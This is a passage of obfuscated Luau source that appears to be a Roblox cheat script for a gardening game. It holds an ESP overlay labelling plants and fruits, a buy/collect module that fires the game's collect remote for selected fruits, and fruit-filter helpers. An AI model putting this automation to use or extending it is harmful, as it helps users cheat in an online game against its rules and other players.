			table.insert(y, string.format("<font color=\'#FFB347\'>\226\156\168 %s</font>", Z.PlantFruitEsp.EscapeRichTextPlantFruitEsp(G)))
		end
		if V ~= "" and V ~= "Normal" then
			table.insert(y, string.format("<font color=\'%s\'>\226\151\134 %s</font>", Z.PlantFruitEsp.GetVariantColourPlantFruitEsp(V), Z.PlantFruitEsp.EscapeRichTextPlantFruitEsp(V)))
		end
		return table.concat(y, " ")
	end,
	BuildPlantTextPlantFruitEsp = function(G, V, y, j, i)
		local c = Z.PlantFruitEsp.EscapeRichTextPlantFruitEsp(G)
		local J = Z.PlantFruitEsp.BuildTraitTextPlantFruitEsp(j, i)
		local T = {}
		if h.plant_fruit_esp_plant_enabled == true then
			table.insert(T, string.format("<font color=\'#7CFC00\'>\240\159\140\177 %s</font> <font color=\'#FFFFFF\'>%sft</font>", c, tostring(V or 0)))
			if J ~= "" then
				table.insert(T, J)
			end
		end
		if type(y) == "string" and y ~= "" then
			table.insert(T, string.format("<font color=\'#66CCFF\'>\240\159\141\137 %s</font>", Z.PlantFruitEsp.EscapeRichTextPlantFruitEsp(y)))
		end
		if # T == 0 then
			return ""
		end
		return "<stroke color=\'#000000\' thickness=\'1\'>" .. (table.concat(T, "\n") .. "</stroke>")
	end;
	BuildFruitTextPlantFruitEsp = function(G, V, y, j)
		local i = Z.PlantFruitEsp.BuildTraitTextPlantFruitEsp(y, j)
		local c = string.format("<font color=\'#FFFFFF\'>%s</font> <font color=\'#66CCFF\'>%s</font>", Z.PlantFruitEsp.EscapeRichTextPlantFruitEsp(G), Z.PlantFruitEsp.EscapeRichTextPlantFruitEsp(V))
		if i ~= "" then
			c = c .. ("\n" .. i)
		end
		return "<stroke color=\'#000000\' thickness=\'1\'>" .. (c .. "</stroke>")
	end,
	RenderDataPlantFruitEsp = function(G, V, y, j)
		local i = Z.PlantFruitEsp
		local c = Z.FruitFiltersDataSync
		G = tostring(G or "")
		if G == "" or type(V) ~= "table" or V.Removed == true then
			return 0, 0
		end
		local J = tostring(V.PlantName or "")
		if J == "" and typeof(y) == "Instance" then
			J = tostring(y:GetAttribute("SeedName") or y.Name or "")
		end
		if J == "" then
			return 0, 0
		end
		local T = 0
		local d = 0
		local u = i.PassesNamePlantFruitEsp(J)
		local q = i.GetDataWorldPositionPlantFruitEsp(V)
		local g, E = i.GetMutationInfoPlantFruitEsp(V, y)
		local a = i.GetPlantLengthPlantFruitEsp(V, y)
		local H = Z.SeedData.IsSingleHarvest(J) == true
		if type(c) == "table" and (type(c.IsSingleHarvestPlant) == "function" and c.IsSingleHarvestPlant(J) == true) then
			H = true
		end
		local r = ""
		if h.plant_fruit_esp_fruit_enabled == true and (H and u) then
			local V, Z = i.GetKgPlantFruitEsp(J, G, "", y, true)
			if i.PassesKgPlantFruitEsp(V) then
				r = Z
				d += 1
			end
		end
		local Y = u and i.BuildPlantTextPlantFruitEsp(J, a, r, g, E) or ""
		local e = y
		if Y ~= "" and (((typeof(e) ~= "Instance" or not e.Parent)) and typeof(q) == "Vector3") then
			local V = i.EnsureDataAnchorPlantFruitEsp(i.GetPlantKeyPlantFruitEsp(G), q)
			if V then
				e = V
			end
		end
		if Y ~= "" and i.UpdateBillboardPlantFruitEsp(e, "plant", Y, a, 1) then
			T += h.plant_fruit_esp_plant_enabled == true and 1 or 0
		end
		if h.plant_fruit_esp_fruit_enabled ~= true or H or type(V.Fruits) ~= "table" then
			return T, d
		end
		local s = 0
		for y, Z in pairs(V.Fruits) do
			if type(Z) ~= "table" or Z.Removed == true then
				continue
			end
			y = tostring(y or Z.FruitId or "")
			if y == "" then
				continue
			end
			if not u then
				continue
			end
			local c = i.GetFruitKeyPlantFruitEsp(G, y)
			local T = j[c]
			local g, E = i.GetKgPlantFruitEsp(J, G, y, T, false)
			if not i.PassesKgPlantFruitEsp(g) then
				continue
			end
			local a, H = i.GetMutationInfoPlantFruitEsp(Z, T, V)
			s += 1
			local r = tonumber(Z.SpawnLocationIndex) or s
			local Y = T
			if ((typeof(Y) ~= "Instance" or not Y.Parent)) and typeof(q) == "Vector3" then
				local G = i.EnsureDataAnchorPlantFruitEsp(c, q)
				if G then
					Y = G
				end
			end
			if i.UpdateBillboardPlantFruitEsp(Y, "fruit", i.BuildFruitTextPlantFruitEsp(J, E, a, H), 0, r) then
				d += 1
			end
		end
		return T, d
	end;
	ScanPlantFruitEsp = function()
		local G = Z.PlantFruitEsp
		local V = 0
		local y = 0
		if not G.IsAnyEnabledPlantFruitEsp() then
			G.CleanupPlantFruitEsp(true)
			G.SetStatusPlantFruitEsp("ESP disabled", "#888888")
			return false
		end
		local j = Z.FruitFiltersDataSync
		if type(j) == "table" and (not j.Started and type(j.StartSync) == "function") then
			j.StartSync()
		end
		local i, c, J = G.GetPhysicalLookupPlantFruitEsp()
		local T = {}
		if type(j) == "table" and type(j.Plants) == "table" then
			for Z, j in pairs(j.Plants) do
				if type(j) ~= "table" then
					continue
				end
				Z = tostring(j.PlantId or j.Id or Z or "")
				if Z == "" then
					continue
				end
				T[Z] = true
				if j.Removed == true then
					continue
				end
				local J, d = G.RenderDataPlantFruitEsp(Z, j, i[Z], c)
				V += J
				y += d
			end
		end
		for i, c in ipairs(J) do
			if typeof(c) ~= "Instance" or not c.Parent then
				continue
			end
			local J = tostring(c:GetAttribute("PlantId") or "")
			if J ~= "" and T[J] then
				continue
			end
			local d = tostring(c:GetAttribute("SeedName") or c.Name or "")
			if d == "" then
				continue
			end
			local u = G.PassesNamePlantFruitEsp(d)
			local q = G.GetSyncPlantPlantFruitEsp(J)
			local g, E = G.GetMutationInfoPlantFruitEsp(q, c)
			local a = G.GetPlantLengthPlantFruitEsp(q, c)
			local H = type(j) == "table" and (type(j.IsSingleHarvestPlant) == "function" and j.IsSingleHarvestPlant(d) == true) or Z.SeedData.IsSingleHarvest(d) == true
			local r = ""
			if h.plant_fruit_esp_fruit_enabled == true and H then
				local V, Z = G.GetKgPlantFruitEsp(d, J, "", c, true)
				if G.PassesKgPlantFruitEsp(V) then
					r = Z
					y += 1
				end
			end
			local Y = u and G.BuildPlantTextPlantFruitEsp(d, a, r, g, E) or ""
			if Y ~= "" then
				if G.UpdateBillboardPlantFruitEsp(c, "plant", Y, a, 1) then
					V += h.plant_fruit_esp_plant_enabled == true and 1 or 0
				end
			end
			if h.plant_fruit_esp_fruit_enabled == true and not H then
				local V = c:FindFirstChild("Fruits")
				if V then
					for V, Z in ipairs(V:GetChildren()) do
						if typeof(Z) ~= "Instance" or not Z.Parent then
							continue
						end
						local j = tostring(Z:GetAttribute("FruitId") or "")
						local i = tostring(Z:GetAttribute("CorePartName") or Z:GetAttribute("SeedName") or d)
						if not u and not G.PassesNamePlantFruitEsp(i) then
							continue
						end
						local c, T = G.GetKgPlantFruitEsp(d, J, j, Z, false)
						if not G.PassesKgPlantFruitEsp(c) then
							continue
						end
						local g = G.GetSyncFruitPlantFruitEsp(J, j)
						local E, a = G.GetMutationInfoPlantFruitEsp(g, Z, q)
						if G.UpdateBillboardPlantFruitEsp(Z, "fruit", G.BuildFruitTextPlantFruitEsp(i, T, E, a), 0, 1) then
							y += 1
						end
					end
				end
			end
		end
		G.CleanupPlantFruitEsp(false)
		G.LastCountPlantFruitEsp = {
			plants = V,
			fruits = y
		}
		G.SetStatusPlantFruitEsp(string.format("Showing %d plants / %d fruits", V, y), "#7CFC00")
		return true
	end;
	StartPlantFruitEsp = function()
		local G = Z.PlantFruitEsp
		if G.StartedPlantFruitEsp then
			return false
		end
		G.StartedPlantFruitEsp = true
		task.spawn(function()
			while G.StartedPlantFruitEsp and not g.is_forced_stop do
				local V, y = pcall(G.ScanPlantFruitEsp)
				if not V then
					G.SetStatusPlantFruitEsp("ESP error", "#FF6666")
					warn("[PlantFruitEsp]", y)
				end
				task.wait(.35)
			end
			G.CleanupPlantFruitEsp(true)
		end)
		return true
	end
}
Z.PlantFruitEsp.StartPlantFruitEsp()
Z.BuySelectFruit = {
	BusyBuySelectFruit = false,
	LastStatusBuySelectFruit = "",
	FruitStockEntriesBuySelectFruit = {};
	LastFruitStockRequestBuySelectFruit = 0,
	FruitStockLoadedBuySelectFruit = false,
	FruitStockSnapshotStartedBuySelectFruit = false;
	FruitStockSnapshotConnectionBuySelectFruit = nil;
	FruitStockLastSnapshotBuySelectFruit = 0;
	FruitStockNextRefreshBuySelectFruit = 0,
	FruitStockServerOffsetBuySelectFruit = 0;
	SetStatusBuySelectFruit = function(G, V)
		G = tostring(G or "")
		V = tostring(V or "#FFFFFF")
		Z.BuySelectFruit.LastStatusBuySelectFruit = G
		local y = g.BuySelectFruitUi
		if type(y) == "table" and (y.StatusLabel and type(y.StatusLabel.SetText) == "function") then
			y.StatusLabel:SetText(string.format("<font color=\'%s\'>%s</font>", V, G ~= "" and G or "Ready"))
		end
	end,
	GetSelectionKeysBuySelectFruit = function(G)
		local V = {}
		if type(G) ~= "table" then
			return V
		end
		for G, y in pairs(G) do
			if type(G) == "number" then
				local G = tostring(y or "")
				if G ~= "" then
					V[G] = true
				end
			elseif y ~= nil and y ~= false then
				local y = tostring(G or "")
				if y ~= "" then
					V[y] = true
				end
			end
		end
		return V
	end;
	FormatPriceBuySelectFruit = function(G)
		G = math.max(math.floor(tonumber(G) or 0), 0)
		if E and (E.Currency and type(E.Currency.FormatMoney) == "function") then
			return E.Currency.FormatMoney(G)
		end
		return tostring(G)
	end,
	ApplyFruitStockSnapshotBuySelectFruit = function(G)
		local V = Z.BuySelectFruit
		if type(G) ~= "table" or type(G.entries) ~= "table" then
			return false
		end
		local y = {}
		for G, V in pairs(G.entries) do
			if type(G) == "string" and type(V) == "table" then
				y[G] = {
					multiplier = math.max(tonumber(V.multiplier) or 1, 0),
					tier = tostring(V.tier or "normal")
				}
			end
		end
		V.FruitStockEntriesBuySelectFruit = y
		V.FruitStockLoadedBuySelectFruit = true
		V.FruitStockLastSnapshotBuySelectFruit = tonumber(G.server_now_unix or G.lastRefreshUnix) or os.time()
		V.FruitStockNextRefreshBuySelectFruit = tonumber(G.nextRefreshUnix) or 0
		if tonumber(G.server_now_unix) then
			V.FruitStockServerOffsetBuySelectFruit = tonumber(G.server_now_unix) - os.time()
		end
		local j = Z.SellMultiplierOverrides
		if h.sell_multiplier_enabled == true and (h.sell_multiplier_collect_only == true and (j and (type(j.HasActiveOverridesSellMultiplierOverrides) == "function" and j.HasActiveOverridesSellMultiplierOverrides()))) then
			j.MarkCollectOnlyCacheDirtySellMultiplierOverrides()
		end
		return true
	end;
	StartFruitStockSnapshotListenerBuySelectFruit = function()
		local G = Z.BuySelectFruit
		if G.FruitStockSnapshotStartedBuySelectFruit then
			return true
		end
		local V = y.Networking and (y.Networking.FruitStock and y.Networking.FruitStock.Snapshot)
		if not V or not V.OnClientEvent then
			return false
		end
		G.FruitStockSnapshotStartedBuySelectFruit = true
		local j, i = pcall(function()
			return V.OnClientEvent:Connect(function(G)
				Z.BuySelectFruit.ApplyFruitStockSnapshotBuySelectFruit(G)
			end)
		end)
		if not j then
			G.FruitStockSnapshotStartedBuySelectFruit = false
			return false
		end
		G.FruitStockSnapshotConnectionBuySelectFruit = i
		return true
	end,
	UpdateFruitStockBuySelectFruit = function(G)
		local V = Z.BuySelectFruit
		V.StartFruitStockSnapshotListenerBuySelectFruit()
		if G ~= true and V.FruitStockLoadedBuySelectFruit == true then
			local G = tonumber(V.FruitStockNextRefreshBuySelectFruit) or 0
			if G <= 0 or os.time() <= G + 5 then
				return true
			end
		end
		local j = os.clock()
		if G ~= true and (V.LastFruitStockRequestBuySelectFruit > 0 and j - V.LastFruitStockRequestBuySelectFruit < 15) then
			return V.FruitStockLoadedBuySelectFruit == true
		end
		local i = y.Networking and (y.Networking.FruitStock and y.Networking.FruitStock.Request)
		if not i or type(i.Fire) ~= "function" then
			return false
		end
		V.LastFruitStockRequestBuySelectFruit = j
		local c, J = pcall(function()
			return i:Fire()
		end)
		if not c then
			return false
		end
		return V.ApplyFruitStockSnapshotBuySelectFruit(J)
	end,
	EnsureFruitStockReadyBuySelectFruit = function(G)
		return Z.BuySelectFruit.UpdateFruitStockBuySelectFruit(G == true)
	end;
	GetFruitStockEntryBuySelectFruit = function(G)
		G = tostring(G or "")
		if G == "" then
			return nil
		end
		local V = Z.BuySelectFruit.FruitStockEntriesBuySelectFruit[G]
		if type(V) ~= "table" then
			return nil
		end
		return V
	end;
	GetSellFlagsPriceBuySelectFruit = function(G, V)
		V = tonumber(V) or 0
		if V <= 0 then
			return 0
		end
		if type(y.SellFlags) == "table" and type(y.SellFlags.Apply) == "function" then
			local Z, j = pcall(function()
				return y.SellFlags.Apply(G, V)
			end)
			if Z and tonumber(j) then
				return math.max(math.floor(tonumber(j) or 0), 0)
			end
		end
		return math.max(math.floor(V), 0)
	end;
	GetMutationMultiplierBuySelectFruit = function(G)
		G = tostring(G or "")
		if G == "" or type(y.MutationData) ~= "table" or type(y.MutationData.ReturnPriceMultiplier) ~= "function" then
			return 1
		end
		local V, Z = pcall(function()
			return y.MutationData.ReturnPriceMultiplier(G)
		end)
		return V and math.max(tonumber(Z) or 1, 0) or 1
	end;
	GetBaseEstimatedPriceBuySelectFruit = function(G, V, j)
		G = tostring(G or "")
		V = type(V) == "table" and V or {}
		local i = tonumber(V.SizeMultiplier or V.SizeMulti) or 1
		local c = tostring(j or "") ~= "" and tostring(j) or nil
		local J = tonumber(V.DecayAlpha)
		if type(y.FruitValueCalc) == "function" then
			local V, Z = pcall(function()
				return y.FruitValueCalc(G, i, c, y.LocalPlayer, J)
			end)
			if V and tonumber(Z) then
				return math.max(math.floor(tonumber(Z) or 0), 0)
			end
		end
		local T = y.SellValueData
		local d = type(T) == "table" and tonumber(T[G]) or nil
		if not d or d <= 0 then
			return 0
		end
		local u = Z.BuySelectFruit.GetMutationMultiplierBuySelectFruit(j)
		return math.max(math.floor((d * (i ^ 3)) * u), 0)
	end,
	GetEstimatedPriceBuySelectFruit = function(G, V, y)
		G = tostring(G or "")
		local j = Z.BuySelectFruit.GetBaseEstimatedPriceBuySelectFruit(G, V, y)
		if j <= 0 then
			return 0, 1, "none"
		end
		local i = Z.BuySelectFruit.GetFruitStockEntryBuySelectFruit(G)
		if type(i) == "table" then
			local G = math.max(tonumber(i.multiplier) or 1, 0)
			return math.max(math.floor(j * G), 0), G, tostring(i.tier or "normal")
		end
		local c = Z.BuySelectFruit.GetSellFlagsPriceBuySelectFruit(G, j)
		local J = j > 0 and c / j or 1
		return c, J, "flags"
	end,
	BuildFruitItemBuySelectFruit = function(G, V, y)
		if type(G) ~= "table" then
			return nil
		end
		local j = Z.FruitFiltersDataSync
		local i = tostring(G.PlantName or "")
		local c = tostring(G.Id or G.PlantId or "")
		local J = y and G or V
		if i == "" or c == "" or type(J) ~= "table" then
			return nil
		end
		local T = y and "" or tostring(J.FruitId or "")
		if not y and T == "" then
			return nil
		end
		if y and type(j.AdvancePlant) == "function" then
			j.AdvancePlant(G)
		elseif type(j.AdvanceFruit) == "function" then
			j.AdvanceFruit(J)
		end
		local d = false
		if y and type(j.IsPlantReady) == "function" then
			d = j.IsPlantReady(G) == true
		elseif type(j.IsFruitReady) == "function" then
			d = j.IsFruitReady(J) == true
		end
		local u = tostring(J.Mutation or G.Mutation or "")
		local q = type(j.GetVariant) == "function" and j.GetVariant(u, J.Variant or G.Variant) or "Normal"
		local E = type(j.GetWeightData) == "function" and j.GetWeightData(i, J, y) or {
			weight = 0,
			text = "0.00kg",
			size = tonumber(J.SizeMultiplier or J.SizeMulti) or 1
		}
		local a = c .. ("||" .. T)
		local H, r, Y = Z.BuySelectFruit.GetEstimatedPriceBuySelectFruit(i, J, u)
		return {
			key = a;
			name = i;
			plantId = c;
			fruitId = T,
			kg = tonumber(E.weight) or 0,
			kgText = tostring(E.text or "0.00kg");
			price = H;
			priceMultiplier = tonumber(r) or 1;
			priceTier = tostring(Y or "normal"),
			mutation = u;
			variant = tostring(q or "Normal");
			ready = d;
			singleHarvest = y == true;
			rarity = g.SeedRarity[i] or "Common"
		}
	end;
	GetAllGardenFruitsBuySelectFruit = function(G)
		local V = {}
		local y = Z.FruitFiltersDataSync
		if type(y) ~= "table" or type(y.Plants) ~= "table" then
			return V
		end
		Z.BuySelectFruit.UpdateFruitStockBuySelectFruit(G == true)
		if not y.Started and type(y.StartSync) == "function" then
			y.StartSync()
		end
		if G == true and type(y.RequestGardenDataFruitFiltersDataSync) == "function" then
			y.RequestGardenDataFruitFiltersDataSync()
			task.wait(.2)
			if type(y.SyncFromGarden) == "function" then
				y.SyncFromGarden(true, true)
			end
		end
		for G, j in pairs(y.Plants) do
			if type(j) ~= "table" or j.Removed then
				continue
			end
			local i = tostring(j.PlantName or "")
			if i == "" then
				continue
			end
			local c = type(y.IsSingleHarvestPlant) == "function" and y.IsSingleHarvestPlant(i) == true or Z.SeedData.IsSingleHarvest(i) == true
			if c then
				local G = Z.BuySelectFruit.BuildFruitItemBuySelectFruit(j, nil, true)
				if G then
					table.insert(V, G)
				end
			else
				for G, y in pairs(j.Fruits or {}) do
					if type(y) == "table" and not y.Removed then
						local G = Z.BuySelectFruit.BuildFruitItemBuySelectFruit(j, y, false)
						if G then
							table.insert(V, G)
						end
					end
				end
			end
		end
		table.sort(V, function(G, V)
			if G.ready ~= V.ready then
				return G.ready == true
			end
			local y = g.RarityRank[tostring(G.rarity or "")] or 0
			local Z = g.RarityRank[tostring(V.rarity or "")] or 0
			if y ~= Z then
				return y > Z
			end
			if ((tonumber(G.price) or 0)) ~= ((tonumber(V.price) or 0)) then
				return ((tonumber(G.price) or 0)) > ((tonumber(V.price) or 0))
			end
			if ((tonumber(G.kg) or 0)) ~= ((tonumber(V.kg) or 0)) then
				return ((tonumber(G.kg) or 0)) > ((tonumber(V.kg) or 0))
			end
			return tostring(G.name or "") < tostring(V.name or "")
		end)
		return V
	end,
	GetDropdownValuesBuySelectFruit = function(G)
		local V = {}
		for G, y in ipairs(Z.BuySelectFruit.GetAllGardenFruitsBuySelectFruit(G)) do
			local j = y.ready and "\226\156\133" or "\240\159\149\146"
			local i = tostring(y.mutation or "") ~= "" and tostring(y.mutation) or "None"
			local c = Z.Data.GetRarityColor(tostring(y.rarity or "Common"))
			local J = Z.BuySelectFruit.FormatPriceBuySelectFruit(y.price)
			local T = tonumber(y.priceMultiplier) or 1
			local d = T ~= 1 and string.format(" x%s", tostring(math.floor(T * 100 + .5) / 100)) or ""
			table.insert(V, {
				Text = string.format("%s <font color=\"#FFFFFF\">%s</font> <font color=\"#66CCFF\">%s</font> <font color=\"#00FF00\">$%s%s</font> <font color=\"#FFCC66\">%s</font> <font color=\"#FF99FF\">%s</font> <font color=\"%s\">%s</font>", j, y.name, y.kgText, J, d, y.variant, i, c, tostring(y.rarity or "Common"));
				Value = y.key
			})
		end
		return V
	end;
	RefreshDropdownBuySelectFruit = function(G, V, y)
		if not G or type(G.SetValues) ~= "function" then
			return false
		end
		local j = Z.BuySelectFruit.GetDropdownValuesBuySelectFruit(V == true)
		G:SetValues(j)
		G:SetValue(g.BuySelectFruitSelected or {})
		if y ~= true then
			local G = Z.BuySelectFruit.FruitStockLoadedBuySelectFruit and " | live prices" or ""
			Z.BuySelectFruit.SetStatusBuySelectFruit(string.format("Loaded %d garden fruits%s", # j, G), # j > 0 and "#66CCFF" or "#FFCC66")
		end
		return true
	end;
	CollectSelectedBuySelectFruit = function(G)
		if Z.BuySelectFruit.BusyBuySelectFruit then
			Z.BuySelectFruit.SetStatusBuySelectFruit("Already collecting", "#FFCC66")
			return 0
		end
		local V = Z.BuySelectFruit.GetSelectionKeysBuySelectFruit(G)
		if next(V) == nil then
			Z.BuySelectFruit.SetStatusBuySelectFruit("Select at least 1 fruit", "#FFCC66")
			return 0
		end
		if not y.CollectFruitNet or type(y.CollectFruitNet.Fire) ~= "function" then
			Z.BuySelectFruit.SetStatusBuySelectFruit("Collect remote unavailable", "#FF6666")
			return 0
		end
		Z.BuySelectFruit.BusyBuySelectFruit = true
		local j = 0
		local i = 0
		local c = 0
		local J = false
		local T = Z.BuySelectFruit.GetAllGardenFruitsBuySelectFruit(true)
		local d = {}
		for G, V in ipairs(T) do
			d[V.key] = V
		end
		for G in pairs(V) do
			if Z.FruitCollect.IsMaxFruitInventory() then
				J = true
				break
			end
			local V = d[G]
			if not V then
				c += 1
			elseif not V.ready then
				i += 1
			elseif Z.FruitCollect.CollectFruit(V.plantId, V.fruitId) then
				j += 1
				task.wait()
			end
		end
		Z.FruitCollect.ResetBucket()
		Z.BuySelectFruit.BusyBuySelectFruit = false
		local u = string.format("Collected %d", j)
		if i > 0 then
			u ..= string.format(" | %d not ready", i)
		end
		if c > 0 then
			u ..= string.format(" | %d gone", c)
		end
		if J then
			u ..= " | inventory full"
		end
		Z.BuySelectFruit.SetStatusBuySelectFruit(u, j > 0 and "#7CFC00" or "#FFCC66")
		return j
	end
}
Z.FruitFilters = {
	RoundWeight = function(G)
		local V = tonumber(G)
		if not V then
			return 0
		end
		return math.round(V * 100) / 100
	end,
	IsSelectionEmpty = function(G)
		if type(G) ~= "table" then
			return true
		end
		for G, V in pairs(G) do
			if V ~= nil and (V ~= false and tostring(V) ~= "") then
				return false
			end
		end
		return true
	end;
	IsSelected = function(G, V)
		V = tostring(V or "")
		if V == "" or type(G) ~= "table" then
			return false
		end
		if G[V] ~= nil and G[V] ~= false then
			return true
		end
		for G, y in pairs(G) do
			if type(G) == "number" and tostring(y or "") == V then
				return true
			end
			if tostring(G or "") == V and (y ~= nil and y ~= false) then
				return true
			end
		end
		return false
	end,
	ParseMutationText = function(G)
		local V = {}
		local y = {}
		if type(G) ~= "string" or G == "" then
			return V, y
		end
		for G in G:gmatch("[^%+%,|/;]+") do
			G = G:match("^%s*(.-)%s*$")
			if G and (G ~= "" and not y[G]) then
				y[G] = true
				table.insert(V, G)
			end
		end
		return V, y
	end,
	SplitMutations = function(G)
		return Z.FruitFilters.ParseMutationText(G)
	end,
	GetRawMutation = function(G)
		if type(G) ~= "table" then
			return ""
		end
		local V = G.ob
		local y = nil
		if typeof(V) == "Instance" then
			y = V:GetAttribute("Mutation")
		end
		if type(y) ~= "string" then
			y = G.m or G.Mutation or G.mutation
		end
		return type(y) == "string" and y or ""
	end;
	GetMutationLookup = function(G)
		local V = Z.FruitFilters.GetRawMutation(G)
		local y, j = Z.FruitFilters.ParseMutationText(V)
		return y, j, V
	end;
	GetVariantFromMutations = function(G)
		if type(G) ~= "table" then
			return "Normal"
		end
		if G.Rainbow then
			return "Rainbow"
		end
		if G.Gold then
			return "Gold"
		end
		return "Normal"
	end,
	IsKnownVariant = function(G)
		G = tostring(G or "")
		return G == "Normal" or G == "Gold" or G == "Rainbow"
	end;
	GetFruitVariant = function(G, V)
		if type(G) ~= "table" then
			return "Normal"
		end
		local y = G.ob
		if typeof(y) == "Instance" then
			local G = {
				"Variant";
				"FruitVariant";
				"Type"
			}
			for G, V in ipairs(G) do
				local j = y:GetAttribute(V)
				if type(j) == "string" and Z.FruitFilters.IsKnownVariant(j) then
					return j
				end
			end
		end
		local j = G.v or G.Variant or G.variant
		if type(j) == "string" and Z.FruitFilters.IsKnownVariant(j) then
			return j
		end
		return Z.FruitFilters.GetVariantFromMutations(V)
	end;
	HasSelectedMutation = function(G, V)
		if type(G) ~= "table" or type(V) ~= "table" then
			return false
		end
		for V in pairs(V) do
			if Z.FruitFilters.IsSelected(G, V) then
				return true
			end
		end
		return false
	end,
	PassesMutationSelection = function(G, V, y)
		G = type(G) == "table" and G or {}
		if not Z.FruitFilters.IsSelectionEmpty(y) then
			if Z.FruitFilters.HasSelectedMutation(y, G) then
				return false
			end
		end
		if not Z.FruitFilters.IsSelectionEmpty(V) then
			return Z.FruitFilters.HasSelectedMutation(V, G)
		end
		return true
	end,
	PassesVariantSelection = function(G, V, y)
		G = tostring(G or "Normal")
		if not Z.FruitFilters.IsSelectionEmpty(y) then
			if Z.FruitFilters.IsSelected(y, G) then
				return false
			end
		end
		if not Z.FruitFilters.IsSelectionEmpty(V) then
			return Z.FruitFilters.IsSelected(V, G)
		end
		return true
	end,
	PassesWeightRange = function(G, V, y)
		G = tonumber(G) or 0
		V = tonumber(V) or 0
		y = tonumber(y) or 1000000000
		if V < 0 then
			V = 0
		end
		if y < V then
			return false
		end
		return G >= V and G <= y
	end,
	GetMutationNames = function()
		local G = {}
		local V = {}
		local Z = y.MutationDataModule
		if Z then
			for y, Z in ipairs(Z:GetChildren()) do
				if not Z:IsA("ModuleScript") then
					continue
				end
				local j = Z.Name
				if j ~= "" and (j ~= "Gold" and (j ~= "Rainbow" and not V[j])) then
					V[j] = true
					table.insert(G, j)
				end
			end
		end
		if # G == 0 then
			G = {
				"Bloodlit";
				"Chained",
				"Electric",
				"Frozen",
				"Pizza",
				"Solarflare",
				"Starstruck"
			}
		end
		table.sort(G)
		return G
	end;
	GetVariantNames = function()
		return {
			"Normal",
			"Gold";
			"Rainbow"
		}
	end;
	GetFruitIds = function(G)
		if type(G) ~= "table" then
			return nil, nil
		end
		return G.plantId, G.fruitId
	end;
	IsFruitReady = function(G)
		if typeof(G) ~= "Instance" then
			return false
		end
		local V = tonumber(G:GetAttribute("Age"))
		local y = tonumber(G:GetAttribute("MaxAge"))
		return V ~= nil and (y ~= nil and (y > 0 and V >= y))
	end;
	GetFruitWeight = function(G)
		if not G or type(y.FruitVisualizerController) ~= "table" then
			return 0, 0
		end
		local V, j = pcall(function()
			if type(y.FruitVisualizerController.CalculateFruitWeight) == "function" then
				return y.FruitVisualizerController:CalculateFruitWeight(G)
			end
			return nil
		end)
		if not V or type(j) ~= "number" then
			V, j = pcall(function()
				if type(y.FruitVisualizerController.CalculatePlantWeight) == "function" then
					return y.FruitVisualizerController:CalculatePlantWeight(G)
				end
				return nil
			end)
		end
		if not V or type(j) ~= "number" then
			return 0, 0
		end
		local i = Z.FruitFilters.RoundWeight(j)
		return i, j
	end,
	GetFruitWeightFromSync = function(G, V)
		if type(V) ~= "table" then
			return 0
		end
		local y = tonumber(V.Weight or V.weight or V.BaseWeight or V.baseWeight)
		if y then
			return Z.FruitFilters.RoundWeight(y)
		end
		return 0
	end;
	BuildFruitData = function(G, V, y, j, i, c)
		y = tostring(y or "")
		j = tostring(j or "")
		i = tostring(i or "")
		if y == "" or j == "" then
			return nil
		end
		local J = 0
		local T = false
		if typeof(G) == "Instance" then
			J = Z.FruitFilters.GetFruitWeight(G)
			T = tonumber(J) ~= nil and tonumber(J) > 0
		elseif type(c) == "table" then
			J = Z.FruitFilters.GetFruitWeightFromSync(y, c)
			T = tonumber(J) ~= nil and tonumber(J) > 0
		end
		local d = ""
		if typeof(G) == "Instance" then
			d = G:GetAttribute("Mutation") or ""
		end
		if d == "" and type(c) == "table" then
			d = c.Mutation or c.mutation or ""
		end
		local u, q = Z.FruitFilters.ParseMutationText(d)
		local E = Z.FruitFilters.GetFruitVariant({
			ob = G;
			m = d
		}, q)
		local a = g.SeedRarity[y] or "Common"
		local H = type(c) == "table" and c or nil
		if type(H) ~= "table" then
			H = {
				SizeMultiplier = typeof(G) == "Instance" and ((G:GetAttribute("SizeMultiplier") or G:GetAttribute("SizeMulti"))) or nil;
				Mutation = d;
				DecayAlpha = typeof(G) == "Instance" and G:GetAttribute("DecayAlpha") or nil
			}
		end
		return {
			ob = G,
			ob_plant = V,
			name = y,
			plantId = j;
			fruitId = i,
			w = J,
			has_weight = T,
			r = a,
			m = d,
			v = E,
			sourceData = H
		}
	end;
	GetAllFruits = function(G)
		local V = Z.FruitFiltersDataSync
		if V and type(V.GetFruits) == "function" then
			local y, Z = pcall(V.GetFruits, nil, G == true)
			if y and type(Z) == "table" then
				local G = tostring(V.DataStateFruitFiltersDataSync or "")
				if # Z > 0 or G == "ready" or G == "empty_new_player" then
					return Z
				end
			end
		end
		local y = {}
		for V, j in ipairs(Z.Farm.GetPlants()) do
			local i = j:GetAttribute("PlantId")
			local c = j:FindFirstChild("Fruits")
			local J = j:GetAttribute("SeedName") or ""
			if c then
				for V, c in ipairs(c:GetChildren()) do
					local T = Z.FruitFilters.IsFruitReady(c)
					if G == true and not T then
						continue
					end
					local d = c:GetAttribute("CorePartName") or c:GetAttribute("SeedName") or J
					local u = c:GetAttribute("FruitId")
					local q = Z.FruitFilters.BuildFruitData(c, j, d, i, u, nil)
					if q then
						q.ready = T
						table.insert(y, q)
					end
				end
			else
				local G = tonumber(j:GetAttribute("Age") or 0)
				local V = tonumber(j:GetAttribute("MaxAge") or 0)
				local c = V > 0 and G >= V
				if c then
					local G = Z.FruitFilters.BuildFruitData(j, j, J, i, "", nil)
					if G then
						G.ready = c
						table.insert(y, G)
					end
				end
			end
		end
		table.sort(y, function(G, V)
			local y = g.RarityRank[G.r] or 0
			local Z = g.RarityRank[V.r] or 0
			if y ~= Z then
				return y > Z
			end
			local j = type(G.m) == "string" and G.m ~= ""
			local i = type(V.m) == "string" and V.m ~= ""
			if j ~= i then
				return j
			end
			return ((tonumber(G.w) or 0)) > ((tonumber(V.w) or 0))
		end)
		return y
	end,
	GetFruitsUsingName = function(G, V)
		local y = {}
		if type(G) ~= "string" or G == "" then
			return y
		end
		for V, Z in ipairs(Z.FruitFilters.GetAllFruits(V)) do
			if Z.name == G then
				table.insert(y, Z)
			end
		end
		return y
	end,
	PassesCollectorFilters = function(G)
		if type(G) ~= "table" then
			return false
		end
		local V = tostring(G.name or "")
		if V == "" then
			return false
		end
		if not Z.FruitFilters.IsSelectionEmpty(h.collect_fruit_list) then
			if not Z.FruitFilters.IsSelected(h.collect_fruit_list, V) then
				return false
			end
		end
		if G.has_weight == false or ((tonumber(G.w) or 0)) <= 0 then
			return false
		end
